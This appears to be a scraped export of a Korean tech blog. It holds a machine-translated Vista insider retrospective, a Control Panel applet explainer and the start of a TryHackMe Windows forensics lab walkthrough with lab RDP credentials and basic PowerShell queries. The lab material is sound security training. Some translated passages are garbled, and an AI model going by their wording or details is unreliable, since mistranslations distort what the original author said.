채택되었습니다. 그후 2년 뒤, Windows 95/98 코드 베이스가 한 번 더 부활하여 매우 비판을 받은 Windows ME를 출시했지만 그 프로젝트는 소규모 팀이 실행한 반면, 대부분은 NT 코드 베이스에 매진했습니다.\n\n제가 운이 좋았던 것은 Windows 2000 개발 시기의 절정기에 참여하여, \"카이로\"의 취소 이후부터 Windows 7 완성까지 머문 12년을 마이크로소프트의 속에서 보낼 수 있었습니다.\n\n저는 임기 7년간 스토리지, 파일 시스템, 고가용성/클러스터링, 파일 레벨 네트워크 프로토콜, 분산 파일 시스템, 복제 프로토콜 등을 책임지는 팀을 관리했습니다. 이는 대략 Windows 2000, XP, Server 2003, 그리고 Longhorn 시기와 일치했습니다.\n\n이후로는 Microsoft의 보안을 관리하는 데 1~2년을 보냈습니다. 이는 \"Longhorn 재설정\" 시점부터 Vista 출시까지 대략입니다. 제 책임은 Windows의 보안 기술부터 보안 소프트웨어 애드온 솔루션, 보안 마케팅, 그리고 보안 패치의 생성, 테스트, 전달 등 비상 대응에 이르기까지 모든 것을 다뤄야 했습니다. 이는 Windows의 바이러스와 웜이 시스템을 망가뜨리는 시기로, 마이크로소프트의 안전한 소프트웨어 개발 명성이 시장에서 심각한 타격을 입고 있던 시기였습니다.\n\n<div class=\"content-ad\"></div>\n\n비스타 출시 후 윈도우 7 기간 동안, 윈도우즈 코어 개발팀을 관리했어요. 이 말은 실제로 “하드웨어 아래에서” 실행되는 모든 기술과 클라이언트 및 서버 팀에서 사용되는 기술을 개발팀이 소유한다는 것을 의미했어요. 비스타가 출시된 후, 윈도우 팀은 직군별로 구성되었고 각 조직의 모든 수준에서 “세 요소”(개발, 테스트, 프로젝트 관리)가 책임을 맡았기 때문에 함께 범죄 동료 두 명이 있었어요. 저는 개발팀을 총괄했고, 그들은 각각 테스트팀과 프로그램 관리팀을 총괄했어요.\n\n윈도우 팀은 대규모이자 야 Ambit이이었던 프로젝트를 시도한 역사가 있었는데, 이 프로젝트들은 종종 몇 년 후에는 포기되거나 다시 활용되었어요. 예를 들어 야 Cairo 프로젝트를 포함, 완벽한 Seoul 프로젝트는 결국 삭제되어 일부 구성 요소 만 윈도우 2000의 일부로 제공되었어요.\n\n내 감동적인 견해로 보면, 윈도우 릴리스의 가장 큰 문제는 각 릴리스의 기간이 오래 걸렸다는 것이었어요. 평균적으로 출시에는 총 세 년이 소요되지만 그 중 “새로운” 코드를 개발하는 데는 약 여섯에서 아홉 개월. 그 시간의 나머지는 통합, 테스트, 알파 및 베타 기간에 소요되었어요 — 각각 수개월 동안 지속되는 시간.\n\n일부 프로젝트는 6개월 이상의 코어 개발이 필요하여 병행으로 계속되어 완료되었을 때 주요 코드 베이스에 통합되었어요. 이는 주요 트리가 거의 항상 대규모의 기능이 통합되거나 교체되는 동안 거의 항상 반쪽 상태에 있음을 의미했어요. 윈도우 7 릴리스 중에는 항상 건강하고 기능하는 코드 베이스를 유지하기 위해 훨씬 더 엄격한 제어가 도입되었지만, 초기 릴리스는 수개월 동안 일상적인 불안전으로 시달렸어요.\n\n<div class=\"content-ad\"></div>\n\n개발의 혼돈한 성격으로 인해 팀들은 종종 일정을 맞추는 데 서로 경쟁을 벌이며, 다른 프로젝트들보다 자신들의 코드가 더 잘되어 있다고 자신들과 다른 사람들을 설득했습니다. 마지막 순간에 몇 가지 남은 작업을 \"정리\"할 수 있다면, 나중에 조금 수정하고 자체 구현한 컴포넌트를 확인할 수 있게 되겠다는 것이죠.\n\n당시에는 Windows 개발 환경이 많은 해를 거쳐 하나로 이어진 도구들의 혼재체였기 때문에 이 문제가 악화되었습니다. 팀들은 자신들만의 컴포넌트를 빌드하고 테스트하는 데 많은 시간을 들여야만 했습니다. 왜냐하면 전체 소스 코드를 처음부터 컴파일하여 감지되지 않은 헤더 파일 종속성을 놓치지 않았는지 확인해야 했기 때문이었죠.\n\n3년의 릴리스 주기는 또한 우리가 릴리스를 시작할 때 경쟁 상황과 외부 생태계가 어떻게 변할지를 거의 알 수 없다는 점을 의미했습니다. 릴리스를 놓치는 것은 기능이 드물게 두 릴리스나 6년 후에는 더 이상 의미가 없게 되어 취소되거나, 더 나쁜 경우에는 시베리아로 추방될 수 있었습니다. 이는 대부분의 수천 명을 포함하는 조직에서 무시받는 컴포넌트의 개발을 계속하게 될 뿐만 아니라 결국 실패하거나 관련성을 잃는 운명에 처할 것이며, 그러나 팀이나 임원들이 단종하기에는 마음이 너무 아픈 프로젝트들도 있었습니다. 나는 그러한 몇 가지 프로젝트를 책임져 왔었습니다. 사후 판단은 쉬워요.\n\n각 팀이 릴리스에 자신들의 계획과 기능들을 밀어넣느라, 다른 컴포넌트와의 통합, 사용자 인터페이스, 끝까지 테스팅과 업그레이드와 같은 지루하고 골치 아픈 문제를 미흡하게 처리하는 경우가 많았습니다. 이로 인해 일부 팀들이 마지막 순간에 자신들의 UI나 업그레이드 테스트를 마무리하는 데 도움을 요청하여 병목 현상이 발생했습니다.\n\n<div class=\"content-ad\"></div>\n\n지금 시점에서, 진행 중인 주요 릴리스가 여러 개 있었고 여러 사이드 프로젝트도 진행 중이었습니다. 다양한 상태의 코드베이스를 관리하던 다른 팀들은 시간이 흘러 “부자는 더 부자가 되고 가난한 사람은 더 가난해지는” 모델로 이어졌습니다. 따라서 어떤 이유로든 뒤쳐진 팀들은 대부분 뒤처졌습니다.\n\n프로젝트가 완료에 가까워질수록 프로그램 매니저들은 다음 릴리스를 위한 요구 사항을 살펴보기 시작했으며 “건강한”(부자) 팀의 개발자들은 다음 릴리스를 위해 새로 “forked”된 소스 트리에서 새 코드를 구현하기 시작했습니다. 하지만 조직의 상당 부분(가난한 팀)은 여전히 현재 릴리스에 갇혀 있었습니다. 특히, 테스트 팀은 릴리스가 출시될 때까지 거의 해방되지 않았기 때문에 새 코드는 프로젝트 초반에 충분히 테스트되지 않았고 “건강하지 않은” 팀은 항상 뒤처졌습니다. 이들 팀은 종종 도덕적이지 않은 코드를 상속받아 이해하지 못하는 엔지니어들이 되었습니다. 몇 년 동안 그러한 팀이 코드 베이스에 도입한 몇 가지 “버그 수정”과 “기능 향상”에 관한 압도적인 공포 이야기를 적을 수 있었습니다.\n\nVista/Longhorn의 대부분 기간 동안, 저는 Windows 파일 시스템 기술에 대한 책임이 있었습니다. 즉, 주로 SQL 데이터베이스 팀이 주도하는 WinFS 노력에 참여했지만 그 팀은 Windows 팀의 자매 조직이었습니다.\n\n빌 게이츠는 매우 상세한 수준에서 개인적으로 참여하여 “WinFS PM”로 농담처럼 불렸습니다: 프로젝트를 담당하는 프로그램 매니저입니다.\n\n<div class=\"content-ad\"></div>\n\n수백, 아니면 수천 명의 엔지니어들이 참여한 엔지니어링 작업이 시간이 흐름에 따라 단순히 지나쳐가면서 발생했습니다: 데이터베이스의 쿼리 기능과 파일 시스템의 스트리밍 기능 및 비정형 데이터 기능을 결합하여 새로운 \"풍요로운\" 응용 프로그램을 만들기 위한 프로그래밍 패러다임으로 노출시키는 아이디어에 대한 일입니다.\n\n이제는 구글이 이 문제를 손쉽게 해결했음이 분명해졌습니다. 비정형 및 구조화된 데이터에 대한 심미적이고 빠른 인덱싱 경험을 제공했으니까요. 그들은 로컬 디스크뿐만 아니라 전체 인터넷에 대해 이 작업을 수행했고, 이를 활용하기 위해 응용 프로그램을 다시 작성할 필요가 없었습니다. 심지어 WinFS가 성공했다 해도, 그 기능을 활용하기 위해 응용 프로그램을 다시 작성하는 데 몇 년이 걸렸을 것입니다.\n\nLonghorn이 취소되고 비스타가 그 재난적인 잔해에서 급히 조합되는 동안, WinFS는 OS 출시에서 제외되었습니다. SQL 팀에 의해 몇 년 동안 스탠드얼론 프로젝트로 추구되었으나, 그때쯤에는 Windows에 기본 인덱싱 엔진과 통합 검색 환경이 내장되어 있었습니다. 이것은 애플리케이션 변경이 필요하지 않은 채로 순수하게 구현되었습니다. 따라서 WinFS의 관련성은 더욱 모호해졌지만 프로젝트는 계속되었습니다.\n\n우리는 선택의 여지가 없었습니다. Windows XP가 우리의 성공의 희생자였음을 밝혀냈습니다. 사용성을 위해 설계된 시스템이 인터넷 시대의 현실과 마주할 때 보안 면에서 큰 결함이 있었습니다. 이러한 보안 문제에 대처하기 위해 병렬 프로젝트인 Windows XP 서비스 팩 2가 생성되었는데, (이름과는 상관 없이) Longhorn으로부터 수천 개의 리소스를 빼앗아가는 거대한 작업이었습니다.\n\n<div class=\"content-ad\"></div>\n\n윈도우 NT 커널은 항상 다중 사용자 ID를 지원하고 관리 권한 경계를 올바르게 구현했지만, 사용자 모드에서는 Windows 95 호환성을 향상시키기 위해 이를 무시했습니다. 이는 시스템의 기본 사용자가 관리 권한을 가진 채로 \"새로 판매 상태\"로 설정되어 있음을 의미했습니다.\n\n응용 프로그램은 보통(그리고 종종 알지 못하고) 이 권한을 남용하여 공통 파일 및 레지스트리 설정을 덮어쓰며 서로 간섭하곤 했습니다. 또한, 시스템을 쉽게 복제할 수 있었던 악성 소프트웨어도 사용자가 관리자(“루트”) 권한으로 실행되어 있었기 때문에 이러한 문제가 발생했습니다.\n\nVista에서 엄격한 관리적 경계를 강제로 적용하면 윈도우 전체의 거의 모든 응용 프로그램이 동작하지 않게 되었습니다. 해결책 중 하나는 UAC (사용자 계정 컨트롤)인데, 이는 아마도 가장 혐오받는 Vista의 기능 중 하나일 것입니다. 시스템이 사용자에게 명령을 실행하거나 레벨을 높이려는 스크립트를 클릭할 때 실제로 권환 레벨을 올릴 의도가 있는지 물어보게 했습니다. 레거시 응용 프로그램을 설치하려면 거의 항상 권한을 높여야 했기 때문에 사용자의 첫 상호작용은 혼란스러운 UAC 팝업창으로 가득했고 이는 경험을 망칠 수 있었습니다.\n\n만약 로그인한 사용자로부터 관리적 액세스가 제거된다면 모든 Windows 앱 중 99%가 제대로 설치조차 되지 않았다고 해도 과언이 아닐 것입니다. Windows 95와의 수십 년간의 하위 호환성은 우리의 손이 묶였다는 것을 의미했고, 안전성을 향상하려면 앱 호환성을 파괴하는 선택을 내려야만 했던 것입니다.\n\n<div class=\"content-ad\"></div>\n\n모든 측면에서 볼 때, Vista는 마이크로소프트에서 출시한 이전 OS들보다 훨씬 더 안전했지만, 이 과정에서 우리는 \"알려진 나쁜\" API를 더 이상 지원하지 않거나 UAC와 같은 메커니즘을 통해 이를 해결하려는 방식으로 애플리케이션 및 장치 드라이버 호환성을 이전과는 다른 방식으로 파괴해 버렸어요.\n\n고객들은 자신들의 앱이 작동하지 않게 되어서 싫어했고, 생태계 파트너들은 드라이버와 애플리케이션을 업데이트하고 인증하는 데 충분한 시간이 없다고 느끼며 Vista가 다시 떠오르는 애플과의 경쟁에서 급히 출시되었다고 불평했어요.\n\n많은 경우, 이러한 보안 변경 사항으로 인해 제삼자 장치 드라이버 및 솔루션에 대한 심층적인 아키텍처 변경이 필요했어요. 대부분의 생태계 업체들은 그들의 레거시 앱에 많은 투자를 할 동기가 없었죠. 이러한 해결책 중 일부는 기능을 구현하기 위해 API 및 다중 프로세서 잠금을 우회하여 데이터 구조 및 심지를 수정하는 비평적인 접근 방식을 취했으며, 종종 혼란을 일으키기도 했어요. 어느 한 시점에, 윈도우 시스템의 약 70%가 이러한 제삼자 드라이버들과 그들의 기능 구현을 위해 지원되는 API를 사용하지 않는 점 때문에 발생하는 시스템 충돌(\"블루 스크린\") 때문에 발생한 것이었어요. 백신 소프트웨어 공급업체들이 이 방식을 사용하는 데 악명 높았어요.\n\n마이크로소프트 보안 책임자로서, 저는 개인적으로 백신 소프트웨어 업체들에게 왜 메모리에 있는 커널 명령과 데이터 구조를 \"패치\"할 수 없게 되었는지, 이것이 보안 위험이 되는 이유, 그리고 앞으로 승인된 API를 사용해야 하는 이유에 대해 몇 년 동안 설명했어요. 더 이상 우리는 윈도우 커널에서 레거시 앱을 지원하지 않고 이러한 접근법을 사용하여 소비자 시스템을 공격하는 해커들이 사용하던 것과 마찬가지로 시스템을 공격하는 제삼자의 필요성이 없다는 걸 알려주었죠.\n\n<div class=\"content-ad\"></div>\n\n\"우리 \"친구\"인 백신 업체들이 우리에게 소송을 제기할 것이라고 협박했어요. 그들은 우리가 그들의 생계를 막고 독점 권력을 남용하고 있다고 주장했습니다! 이런 친구가 있으면 적이 뭐 필요해요? 그들은 단지 이전 솔루션들이 계속 작동되기를 원했던 것뿐이지만, 그것이 우리 고객들의 보안을 감소시킨다 해도요—우리가 개선해야 할 것이었던 것을요.\n\n그 몇 년 동안 컴퓨팅 산업에서 팽팽한 변화가 있었어요—인터넷의 등장, 휴대전화의 급부상, 클라우드 컴퓨팅의 등장, 새로운 광고 기반 비즈니스 모델의 창출, 소셜 미디어의 바이럴한 성장, 모어의 법칙의 무차별적인 행진, 64비트 컴퓨팅의 성숙, 저렴하고 신뢰할 수 있는 저장 공간, 풍부한 네트워킹 대역폭, 진화하는 보안 및 개인 정보 보호 환경, 그리고 오픈 소스의 인기 등이 윈도우에게 모든 방향에서 공격을 가했죠.\n\n놀랄만큼 성공적인 플랫폼이었기 때문에 우리의 대답은 그 자리에 있어서 기존 시스템을 점진적으로 개선하는 것이었어요—혁신자의 딜레마를 간단히 말하자면요. 우리가 코드를 계속 추가할수록, 우리는 더 복잡함을 만들었고, 팀도 커졌고, 생태계도 커졌고, 경쟁 상대를 앞지르는 것이 더 어려워졌어요.\n\n경쟁적인 힘만으로도 부족하지 않은 것처럼, 엔지니어들과 프로그램 매니저들의 군단이 소비자의 편의를 위해 이전 릴리스의 API를 문서화하기 위해 DOJ 및 기업 변호사들과 무수히 많은 시간, 하루, 주, 달을 보냈던 시기기도 했어요.\"\n\n<div class=\"content-ad\"></div>\n\n현실적으로 말하자면, 현재의 수명주기에서 윈도우의 주요 릴리스를 완성하는 데는 대략 3년이 걸렸고, 그 속도는 빠르게 움직이는 시장에는 너무 느린 것으로 판명되었습니다. 롱혼(Longhorn)에서는 WinFS, 보안, 그리고 관리 코드 등 여러 거대한 프로젝트들이 계획되었습니다. 수백 개의 더 작은 베팅 프로젝트들도 있었습니다.\n\n수백 명의 직원으로 이뤄진 조직과 수십억 명이 넘는 고객이 있다면 누구나 의견을 내기 마련입니다. 곧 출시될 태블릿과 스마트폰에서 작동할 예정인 동일한 OS 릴리스는 노트북, 데이터 센터 서버, NAS 상자와 같은 임베디드 장치, 그리고 클라우드 내 하이퍼바이저(HyperV) 위에서도 작동해야 했습니다. 이러한 요구사항은 시장의 모든 세그먼트에 동시에 전진하려는 시도로 인해 팀을 상반되는 방향으로 이끌었습니다.\n\n롱혼과 비스타(Vista)를 고립시켜 보는 것은 불가능합니다. 이들은 그들 앞뒤로 즉시 출시된 윈도우 2000과 XP, 윈도우 서버 2008과 윈도우 7과 함께 포괄 산업 지식 속에서 봤을 때에만 의미를 가집니다.\n\n<div class=\"content-ad\"></div>\n\n윈도우는 자신의 성공에 휩쓸렸습니다. 다양한 시장에 성공적으로 파고들었고 각 사업이 이제 운영 체제의 디자인에 어떤 영향을 끼치며 서로 다른 방향으로 끌어당겼습니다. 이러한 이질적인 요구 사항을 충족시키려고 한다는 것은 그 중 어느 하나를 완전히 만족시키지 못하는 것을 의미했습니다.\n\n90년대에 대단히 성공했던 아키텍처가 주변 환경이 더욱 신속하게 변화할 때 더디게 느려졌으며 조직은 변화에 발 맞추기 어려워했습니다.\n\n분명히 이러한 추세들을 보았고 그에 대응하기 위해 노력했지만, 유사육아가 프리 출시로 3년 후 출시될 때 2년 동안 비행기를 개량하는 것은 매우 어려웠습니다.\n\n간단히 말하자면, 3-4년 전에 특정 운영 체제 출시를 계획했을 때 우리가 알았다고 생각했던 것들은 그 제품이 마침내 배송되었을 때 웃기게 구식이었고 때로는 완전히 잘못된 것들도 있었습니다.\n\n<div class=\"content-ad\"></div>\n\n가장 좋았던 일은 우리가 점차적이고 마찬가지로 안정적인 방식으로 새로운 클라우드 기반 서비스를 간소화된 기기에 제공할 수 있도록 한 것이었습니다. 대신, 우리는 필요할 때 속도를 내야 할 때마다 우리를 늦춘 각 릴리스 전에 몇 달 동안 테스트가 필요한 기존의 클라이언트 기반의 단일 시스템에 기능을 계속 추가했습니다. 물론, 이전 Windows 릴리스에서 이미 실행 중인 애플리케이션들에 의해 호환성을 위해 필요했던 이전 기능들을 제거할 용기가 없었죠.\n\n이제 수십억 명의 고객, 수백만 기업, 수천 개 파트너, 수백 가지 시나리오 및 수십 가지 형태 요소를 위한 일 년 이상의 동일한 OS를 지원해야 한다고 상상해보면, 지원 및 호환성 악모지란을 조금이라도 알 수 있을 겁니다.\n\n후에야, Linux는 이 측면에서 더욱 성공적이었습니다. 오픈 소스 커뮤니티와 소프트웨어 개발 접근 방식은 분명한 해결책의 한 부분입니다. Unix/Linux의 모듈식 및 플러그 가능한 아키텍처도 이 측면에서 큰 구조적 개선입니다.\n\n전혀 다른 접근 방식을 취한 Apple은 문제 공간을 축소하여 전체 품질과 최종 사용자 경험을 향상시킬 수 있는 방법을 보여 주었습니다. 기존 서버 및 저장 노력을 중단하고 이전 호환되지 않는 PowerPC 아키텍처를 지원 중단하며 새로운 형태 요소에 직면했을 때 macOS와 구분된 iOS라는 새로운 운영 체제를 탄생시켰습니다. 비교적으로 Windows는 모든 사람에게 모든 것이 되려고 했습니다.\n\n<div class=\"content-ad\"></div>\n\n조직은 결국 자신의 제품으로 조직도를 출시합니다(콘웨이의 법칙); Windows 조직도 예외는 아니었습니다.\n\n![이미지](/assets/img/2024-05-20-WhatReallyHappenedwithVistaAnInsidersRetrospective_3.png)\n\n그에 더해 내부 조직적 역학과 개성을 더하면 어떻습니까? 우리는 각자의 취향 있는 기능을 가졌고, 우리 생태계 파트너들이 새로운 표준을 채택하도록 우리를 격려하고, 솔루션을 플랫폼에서 인증하는 데 도움을 요청하고, 특정 시나리오에 대한 API를 추가하도록 요청했습니다. 우리는 모두 우리의 기술, 우리의 아이디어가 이길 것이라고 믿었습니다... 만약 우리가 다음 Windows 릴리스에 그것을 간신히 넣고 순식간에 수백만 명의 고객을 확보할 수 있다면요.\n\n우리는 이를 위해 기획 회의와 매일의 전쟁 회의에서 싸우기도 충분히 믿었습니다. 다른 모든 조직과 마찬가지로, 승진을 원하고 영향력을 더하거나, 대리팀 크기를 증가시키고 싶어 하는 매니저도 있었습니다.\n\n<div class=\"content-ad\"></div>\n\n흑자인가요, 어떤가요? 지난 해 산업 수준의 문제가 종종 발생하곤 했습니다. 발생이 불가피할 때입니다. 그러나 이는 죄송하다는 말이 아닌 이해해 주셨으면 하는 바람입니다.그나저나, 실수를 했을까요? 네, 많았습니다.의도적으로 잘못된 결정을 내렸을까요? 아니요, 그렇게 기억나지 않아요.\n\n<div class=\"content-ad\"></div>\n\n상당히 복잡한 제품이었나요? 놀랍도록 거대한 생태계를 가지고 있나요 (당시 세계 최고의 생태계)? 네, 그랬습니다.\n\n더 잘 할 수 있었나요? 네, 그렇습니다. 빠르게 변화하는 시장에서 단계적인 접근은 적대적입니다.\n\n오늘 다른 결정을 내릴까요? 네, 그렇습니다. 지식은 나중에야 20/20으로 드러납니다. 당시에는 지금 알고 있는 것을 몰랐습니다.\n\n그 실수로 배우고 다음 번엔 더 잘할 수 있었나요? 네. 윈도우 사용자라면 누구나 동의할 것 같아요. 비스타의 후속인 윈도우 7은 상품으로서 훨씬 성공적이었습니다. 사실, 대부분의 분석가와 사용자가 윈도우 XP와 함께 역사상 가장 우수한 릴리즈 중 하나로 여기고 있습니다. 사용자들이 \"마이크로소프트가 '차가운 주검 손에서 떼어낼' 필요가 있다\"라고 말한 것을 들었어요. 윈도우 7의 핵심 개발팀 책임자로서 그 노력에 참여한 것을 자랑스럽게 생각해요. 윈도우 팀은 비스타의 많은 실수로부터 배워서 훨씬 더 나은 제품을 제공했습니다. 비스타만큼 구조적으로 야심찼나요? 아니요. 그럼에도 세 배나 걸렸나요? 네.\n\n<div class=\"content-ad\"></div>\n\n윈도우 8에 일어난 일은 전혀 다른 이야기입니다. 그 당시에는 회사를 떠난 상태였기 때문에 그에 대해 논평할 자격이 없습니다.\n\n비스타를 회고하며 안타깝게 생각할까요? 아니요, 저는 그것을 배운 교훈으로 바라보는 것을 선호합니다. 저희 중 아무도 나중 프로젝트에서 같은 실수를 반복하지 않았을 거라 확신합니다. 우리는 그 경험으로부터 배웠기 때문에 다음 번에는 전혀 다른 실수를 했을 거라고 생각합니다. 실수는 인간적이죠.\n\n이 게시물을 즐겼다면, 운영 체제 플랫폼의 진화에 관한 후속 포스트도 즐길 수 있을 것입니다.\n\n흥미로운 다른 블로그 포스트 목록입니다:","ogImage":{"url":"/assets/img/2024-05-20-WhatReallyHappenedwithVistaAnInsidersRetrospective_0.png"},"coverImage":"/assets/img/2024-05-20-WhatReallyHappenedwithVistaAnInsidersRetrospective_0.png","tag":["Tech"],"readingTime":12},{"title":"Windows Concept 여행 - Control Panel","description":"","date":"2024-05-20 18:20","slug":"2024-05-20-TheWindowsConceptJourneyControlPanel","content":"\n\n\"Control Panel\"의 목표는 운영 체제의 시스템 수준 기능 구성을 도와주는 것입니다. 이에는 시스템 유지 보수, 보안, 하드웨어/소프트웨어 설정 및 사용자 계정 관리 등이 포함됩니다. \"Control Panel\"을 언급할 때는 일반적으로 Windows 제어판 전체 기능을 의미하며, 특정 제어판은 아래 스크린샷에 표시된 것과 같이 \"Control Panel Items\"로 참조됩니다.\n\n전반적으로, 제어판 항목은 \"앱렛(applet)\"로도 불립니다. 각 앱렛은 기본적으로 \"CPlApplet\" 함수를 익스포트하는 \"*.CPL\" 파일이며, DLL/PE 파일입니다. \"앱렛\"을 등록하는 몇 가지 방법이 있습니다. \"*.CPL\" 파일을 \"%windir%\\System32\" 디렉터리에 배치하는 것도 그 중 하나입니다. 또한, 앱렛에 대한 정보(위치/이름의 CPL 파일)를 다음 하위키에 추가하는 것도 하나의 방법입니다: \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Control Panel\\Cpls\".\n\n마지막으로, 앱렛에 대한 CLSID(클래스 식별자, Microsoft의 \"Component Object Model\" 즉, COM의 일부)를 다음 위치에 추가할 수도 있습니다: \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ControlPanel\\NameSpace\". 추가로, 앱렛에 의해 수행된 구성은 주로 로컬 컴퓨터에 관련이 있습니다. MMC 스냅인은 \"mmc.exe\"에 의해 호스팅되며, MS-RPC와 같은 프로토콜을 사용하여 원격 관리를 지원합니다.\n\n다음 글에서 뵙겠습니다 ;-) 트위터에서 저를 팔로우해보세요 — @boutnaru (https://twitter.com/boutnaru). 그리고 미디엄에서 다른 글도 읽을 수 있습니다 — https://medium.com/@boutnaru. 무료 eBook은 https://TheLearningJourneyEbooks.com에서 찾아볼 수 있습니다.\n\n<div class=\"content-ad\"></div>\n\n![2024-05-20-TheWindowsConceptJourneyControlPanel_0](/assets/img/2024-05-20-TheWindowsConceptJourneyControlPanel_0.png)","ogImage":{"url":"/assets/img/2024-05-20-TheWindowsConceptJourneyControlPanel_0.png"},"coverImage":"/assets/img/2024-05-20-TheWindowsConceptJourneyControlPanel_0.png","tag":["Tech"],"readingTime":2},{"title":"TryHackMe 윈도우 탐색 - 태스크 1 윈도우 탐색","description":"","date":"2024-05-20 18:17","slug":"2024-05-20-TryHackMeInvestigatingWindowsTask1InvestigatingWindows","content":"\n\n윈도우 머신이 해킹되었어요. 당신의 임무는 이 윈도우 머신을 조사하고 해커가 무엇을 했는지 단서를 찾는 겁니다.\n\n여기 도전 과제가 있어요. 이 도전 과제는 완전히 표지에 적힌 대로에요. 이전에 침해당한 윈도우 머신을 조사하는 것에 대한 몇 가지 도전 과제가 있어요.\n\nRDP를 사용하여 머신에 연결해보세요. 해당 머신의 자격 증명은 다음과 같아요:\n\n사용자명: Administrator\n비밀번호: letmein123!\n\n<div class=\"content-ad\"></div>\n\n위에 있는 내용을 번역하면 다음과 같습니다.\n\n# 아래의 질문에 대답해주세요\n\n# 시작하기\n\n작업을 시작하기 전에 먼저 몇 가지를 처리해야 합니다. 먼저, 가상 머신과 OpenVPN을 시작하겠습니다. 가상 머신의 경우, 작업 2로 돌아가서 녹색으로 표시된 \"가상 머신 시작\" 버튼을 클릭해주세요. \n\n(해당 기기는 핑(ICMP)에 응답하지 않을 수 있으며 부팅이 완료되기까지 몇 분이 소요될 수 있습니다.)\n\n<div class=\"content-ad\"></div>\n\n\\<img src=\"/assets/img/2024-05-20-TryHackMeInvestigatingWindowsTask1InvestigatingWindows_0.png\" />\n\nOpenVPN을 사용할 때는 컴퓨터에서 프로그램을 실행한 후 슬라이더를 클릭하여 TryHackMe VPN 네트워크에 연결하세요.\n\n\\<img src=\"/assets/img/2024-05-20-TryHackMeInvestigatingWindowsTask1InvestigatingWindows_1.png\" />\n\n컴퓨터에서 openVPN을 어떻게 가져오고 사용하는지 확실하지 않다면 TryHackMe Access로 이동하세요. 거기에서 필요한 파일 및 openVPN 다운로드 위치에 대한 정보를 얻을 수 있습니다.\n\n<div class=\"content-ad\"></div>\n\n이제 가상 머신이 실행되고 우리의 openVPN이 연결되었으므로 Active Directory 가상 머신에 RDP(원격 데스크톱)로 연결할 수 있습니다. 다음은 그 방법입니다. Windows 머신을 사용할 수 있습니다. 모든 Windows PC에는 이미 RDP가 설치되어 있습니다. RDP를 열려면 키보드에서 Windows 키를 누르세요. 시작 메뉴가 열릴 것이지만 해야 할 일은 \"rdp\"만 입력하면 됩니다. Windows가 자동으로 검색하여 한 가지 결과를 보여줄 것이고, 그것은 원격 데스크톱 연결입니다. 엔터를 눌러 열어주세요.\n\n![RDP](/assets/img/2024-05-20-TryHackMeInvestigatingWindowsTask1InvestigatingWindows_2.png)\n\n창이 팝업되어 원격 데스크톱 연결을 위한 화면이 나타납니다. 창의 왼쪽 하단에 \"옵션 표시\"라고 표시된 당근 모양이 있습니다. 해당 당근을 클릭하세요.\n\n![Options](/assets/img/2024-05-20-TryHackMeInvestigatingWindowsTask1InvestigatingWindows_3.png)\n\n<div class=\"content-ad\"></div>\n\n창이 확장되어 사용자 이름을 추가할 수 있는 옵션이 제공됩니다. 먼저, 컴퓨터 필드에는 TryHackMe가 제공한 Active Directory 기계의 IP 주소를 입력합니다. 두 번째로, 사용자 이름 필드에 Administrator를 입력합니다(이렇게 입력하여 THM 도메인에 연결합니다). 마지막으로, 우리 기계에 연결하기 위해 오른쪽 하단의 연결 버튼을 클릭합니다.\n\n![이미지](/assets/img/2024-05-20-TryHackMeInvestigatingWindowsTask1InvestigatingWindows_4.png)\n\n창이 팝업되어 암호를 입력하라는 메시지가 표시됩니다. 따라서 암호 필드에 letmein123!을 입력한 후 확인을 누릅니다.\n\n![이미지](/assets/img/2024-05-20-TryHackMeInvestigatingWindowsTask1InvestigatingWindows_5.png)\n\n<div class=\"content-ad\"></div>\n\n커야할 일을 확인하십시오. 불안한 메시지가 표시될 것이지만 안심하세요. 이겪은 원격 PC에 연결하려면 '예' 버튼을 클릭하면 됩니다.\n\n![image](/assets/img/2024-05-20-TryHackMeInvestigatingWindowsTask1InvestigatingWindows_6.png)\n\n그러면 Windows 데스크톱 환경으로 이동하게 됩니다.\n\n![image](/assets/img/2024-05-20-TryHackMeInvestigatingWindowsTask1InvestigatingWindows_7.png)\n\n<div class=\"content-ad\"></div>\n\n화면 왼쪽 하단의 시작 아이콘을 클릭하세요. 시작 메뉴가 나타나면 Windows PowerShell로 이동해서 클릭하세요.\n\n![이미지](/assets/img/2024-05-20-TryHackMeInvestigatingWindowsTask1InvestigatingWindows_8.png)\n\n이제 아래의 질문에 대답하기 시작할 준비가 되었습니다.\n\n## 윈도우 머신의 버전과 연도는 무엇인가요?\n\n<div class=\"content-ad\"></div>\n\n## 진행 방법:\n\nPowerShell이 열렸으니 몇 가지 명령을 실행하여 정보를 얻어봅시다. 시작하려면 Get-ComputerInfo 명령을 사용하여 모든 시스템 정보를 나열할 수 있습니다.\n\n![이미지](/assets/img/2024-05-20-TryHackMeInvestigatingWindowsTask1InvestigatingWindows_9.png)\n\n우리는 이를 좁히어야 합니다. 원하는 정보를 알고 있다면 Get-ComputerInfo -Property “Os*” 명령을 사용하여 해당 정보만 출력할 수 있습니다. 이렇게 하면 'Os'로 시작하는 것만 출력됩니다. 답은 첫 번째 출력 항목으로 확인할 수 있습니다.\n\n<div class=\"content-ad\"></div>\n\n\n![image](/assets/img/2024-05-20-TryHackMeInvestigatingWindowsTask1InvestigatingWindows_10.png)\n\nAnswer: Windows Server 2016\n\n## Which user logged in last?\n\n## How To:\n\n\n<div class=\"content-ad\"></div>\n\n먼저 LocalUser의 이름을 확인해야 합니다. 이를 위해 Get-LocalUser 명령을 사용할 수 있어요. 이 명령을 통해 LocalUser를 나열하고 작업할 수 있는 목록을 얻을 수 있어요.\n\n![이미지](/assets/img/2024-05-20-TryHackMeInvestigatingWindowsTask1InvestigatingWindows_11.png)\n\n이제 LocalUser 목록을 가지고 net user 'username' |findstr “Last” 명령을 사용해서 해당 사용자의 최근 로그인을 볼 수 있어요. 이 명령을 실행하면 사용자가 시스템에 마지막으로 로그인한 시간을 확인할 수 있어요. 정말 놀랄만한 답을 얻게 될 거에요.\n\n![이미지](/assets/img/2024-05-20-TryHackMeInvestigatingWindowsTask1InvestigatingWindows_12.png)\n\n<div class=\"content-ad\"></div>\n\n답변: 관리자\n\n## 존이 시스템에 마지막으로 로그인한 시간은 언제인가요?\n\n답변 형식: MM/DD/YYYY H:MM:SS AM/PM\n\n## 사용 방법:\n\n<div class=\"content-ad\"></div>\n\n이전 질문에서의 결과를 다시 살펴보세요. John을 보세요. 그 정담을 복사하여 답변란에 붙여넣기하세요. 월과 일 앞에 0 두 개를 추가하면 됩니다.\n\n![이미지](/assets/img/2024-05-20-TryHackMeInvestigatingWindowsTask1InvestigatingWindows_13.png)\n\n답변: 03/02/2019 